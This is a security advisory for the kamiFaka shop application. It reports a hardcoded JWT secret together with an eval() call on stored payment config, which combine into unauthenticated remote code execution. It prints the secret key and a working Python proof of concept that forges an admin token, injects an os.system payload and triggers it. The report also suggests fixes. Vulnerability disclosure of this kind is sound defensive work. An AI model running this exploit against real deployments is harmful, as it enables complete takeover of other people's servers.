# Vulnerability Report

## Summary
- **Title**: Unauthenticated RCE via Hardcoded JWT Secret and eval() in kamiFaka
- **Affected Version**: all versions (as of 2026-06-28)
- **CWE**: CWE-798 (Use of Hard-coded Credentials), CWE-94 (Code Injection)
- **CVSS 3.1 Score**: 9.8 Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Vendor**: Baiyuetribe
- **Product**: kamiFaka
- **Repository**: https://github.com/Baiyuetribe/kamiFaka

## Description

kamiFaka contains a critical vulnerability chain that allows unauthenticated remote code execution (RCE):

### 1. Hardcoded JWT Secret (CWE-798)

In `service/api/db.py` line 64, the JWT secret key is hardcoded:

```python
app.config['JWT_SECRET_KEY'] = 'EXZgC3BMhPxtu4Kq6W7mo9rAT0yYGsOiQNf5vUInSjRVeb'
```

The `mod_key()` function in `init_mysql.py` intended to randomize it on first run, but it searches for the wrong pattern (`a44545de51d5e4deaswdedcecvrcrfr5f454fd1cec415r4f`) which does not match the actual committed value. The secret is never replaced.

### 2. Remote Code Execution via eval() (CWE-94)

In `service/database/models.py` line 68, the `Payment.all_json()` method uses `eval()` to deserialize the `config` column:

```python
'config': eval(self.config),
```

The same pattern exists in `Plugin.to_json()` (line 558) and `Notice.to_json()` (line 585).

### Attack Chain

1. Attacker forges a valid admin JWT using the known secret key
2. Attacker calls the admin API (`/api/v4/update_pays`) to write malicious Python code into a payment config field
3. Any subsequent read of the payment config triggers `eval()`, executing the injected code

## Proof of Concept

```python
import jwt, requests, datetime

TARGET = "http://target:8000"
JWT_SECRET = "EXZgC3BMhPxtu4Kq6W7mo9rAT0yYGsOiQNf5vUInSjRVeb"

# Step 1: Forge admin JWT
token = jwt.encode(
    {"identity": {"email": "admin@qq.com"},
     "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)},
    JWT_SECRET, algorithm="HS256"
)
headers = {"Authorization": f"Bearer {token}"}

# Step 2: Inject code into payment config
requests.post(f"{TARGET}/api/v4/update_pays", json={
    "data": {"id": 1, "icon": "x",
             "config": "__import__('os').system('id > /tmp/pwned')",
             "isactive": True}
}, headers=headers)

# Step 3: Trigger eval() by reading config
requests.get(f"{TARGET}/api/v4/get_pays", headers=headers)
# /tmp/pwned now contains the output of 'id'
```

## Impact

Complete server takeover. An unauthenticated attacker can execute arbitrary system commands on any kamiFaka deployment.

## Suggested Fix

1. Replace `eval()` with `json.loads()` for config deserialization
2. Generate a random JWT secret on first run and store it securely
3. Remove the hardcoded secret from source code

## Credit
- Discovered by: goutou (https://github.com/goutouanquan)
- Contact: goutouanquan@163.com
